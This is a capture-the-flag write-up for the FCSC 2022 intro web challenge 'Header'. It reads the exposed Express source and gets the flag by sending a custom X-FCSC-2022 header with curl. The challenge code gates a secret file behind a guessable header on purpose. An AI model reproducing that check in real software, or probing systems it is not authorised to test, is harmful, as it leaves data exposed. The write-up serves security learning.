# Header

**Competition:** FCSC 2022 (Intro)
**Category:** Web
**Service:** `localhost:8000`

---

## Description

> "Pour cette épreuve, vous devrez vous pencher sur une fonctionnalité essentielle du protocole HTTP."

The title and description are short: the vulnerability is in the **HTTP headers**.

---

## Solution

### 1. Initial reconnaissance

Run a quick request to the service:

```bash
curl -v http://localhost:8000
```

The response is an HTML page containing:

```
No flag for you. Want a meme instead?
```

Notable response headers:

```
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
```

This indicates an Express/Node.js app. The site navbar contains a link to `/source`, a promising place to look.

---

### 2. Source analysis

Fetch the source endpoint:

```bash
curl http://localhost:8000/source
```

Relevant Node.js code:

```javascript
app.get('/', async (req, res) => {
    var verif = req.header("X-FCSC-2022");
    if (verif == "Can I get a flag, please?") {
        var flag = fs.readFileSync("flag.txt");
        res.render("pages/index", {
            type: "success",
            msg: "Here it is: " + flag,
        });
    } else {
        res.render("pages/index", {
            type: "warning",
            msg: "No flag for you. Want a meme instead?",
        });
    }
});
```

Vulnerability found: the server reads the custom HTTP header `X-FCSC-2022` and compares it to the literal string `"Can I get a flag, please?"`. If the header matches, the flag file is read and returned in the page body.

There is no authentication or token, sending the correct header is sufficient.

---

### 3. Exploit

Send the header with `curl`:

```bash
curl -H "X-FCSC-2022: Can I get a flag, please?" http://localhost:8000
```

Response (excerpt):

```html
<div id="alert" class="alert alert-success">
    <strong>Here it is: FCSC{...}</strong>
</div>
```

---

## Flag

```
FCSC{...}
```

---

## Conclusion

Simple HTTP reconnaissance and source inspection. The chain is:

1. Source exposed at `/source` reveals the logic
2. Server checks custom header `X-FCSC-2022` with a plain equality comparison
3. Injecting the correct header (`curl -H`) returns the flag in the HTML body
